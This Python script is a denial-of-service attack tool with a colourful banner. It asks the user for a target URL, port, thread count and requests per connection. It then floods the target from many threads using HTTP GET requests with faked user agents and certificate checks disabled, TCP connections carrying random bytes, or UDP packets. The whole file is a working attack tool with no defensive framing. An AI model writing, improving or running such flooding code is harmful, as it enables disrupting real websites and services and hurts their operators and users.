import socket
import threading
import os
import random
from colorama import Fore
from fake_useragent import UserAgent
from ssl import CERT_NONE, SSLContext, create_default_context
from urllib.parse import urlparse
from certifi import where
from datetime import datetime

red = Fore.LIGHTRED_EX; green = Fore.LIGHTGREEN_EX; blue = Fore.LIGHTBLUE_EX; yellow = Fore.LIGHTYELLOW_EX; cyan = Fore.LIGHTCYAN_EX; white = Fore.LIGHTWHITE_EX; magenta = Fore.LIGHTMAGENTA_EX;

os.system('cls || clear')
print(Fore.LIGHTGREEN_EX+
    f"""
                ╔═╗╦ ╦╔╦╗╦ ╦╔═╗  ╦  ╔═╗╔═╗╦═╗╔╗╔ {Fore.LIGHTRED_EX}Welcome{Fore.LIGHTRED_EX}
                ╠═╝╚╦╝ ║ ╠═╣║ ║  ║  ║╣ ╠═╣╠╦╝║║║ {Fore.LIGHTYELLOW_EX}Created By John Wick{Fore.LIGHTYELLOW_EX}
                ╩   ╩  ╩ ╩ ╩╚═╝  ╩═╝╚═╝╩ ╩╩╚═╝╚╝ {Fore.LIGHTBLUE_EX}Big team of Pytho Learn{Fore.LIGHTWHITE_EX}

                    {green}Methods {red}|{blue} LAYER7{red} : {yellow}({red} HTTP{yellow} ){red} |{cyan} LAYER4 {red}: {yellow}({green} UDP {red},{green} TCP {yellow})
    """
    )


method = input(f'{red}[{yellow}+{red}]{green} Method {red}: ')
url = input(f'{red}[{yellow}+{red}]{blue} Target {red}: ')
port = int(input(f'{red}[{yellow}+{red}]{yellow} Port {red}: '))
tr = int(input(f'{red}[{yellow}+{red}]{cyan} Threads {red}: '))
rpc = int(input(f'{red}[{yellow}+{red}]{magenta} Rpc {red}: '))

print(Fore.LIGHTRED_EX+"\n["+Fore.LIGHTYELLOW_EX+"×"+Fore.LIGHTRED_EX+"]", Fore.LIGHTGREEN_EX + "Attack", Fore.LIGHTCYAN_EX + "Started", Fore.LIGHTYELLOW_EX + "!" + Fore.LIGHTRED_EX + "!" + Fore.LIGHTGREEN_EX + "!")

parsed_url = urlparse(url)
target = parsed_url.netloc
path = parsed_url.path

ssl = create_default_context(cafile=where())
ssl.check_hostname = False
ssl.verify_mode = CERT_NONE

if path == "":
    path = "/"


ua = UserAgent()

def httphead():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode()

def http():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = httphead()
                s.send(payl)
        except:
            pass

def tcp():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target,port))
            rn = random._urandom(1024)
            s.send(rn)
        except:
            pass

def udp():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target,port))
        rn = random._urandom(1024)
        s.send(rn)
    except:
        pass

if method == 'http':
    for _ in range(tr):
        t = threading.Thread(target=http)
        t.start()
elif method == 'tcp':
    for _ in range(tr):
        t = threading.Thread(target=tcp)
        t.start()
elif method == 'udp':
    for _ in range(tr):
        t = threading.Thread(target=udp)
        t.start()
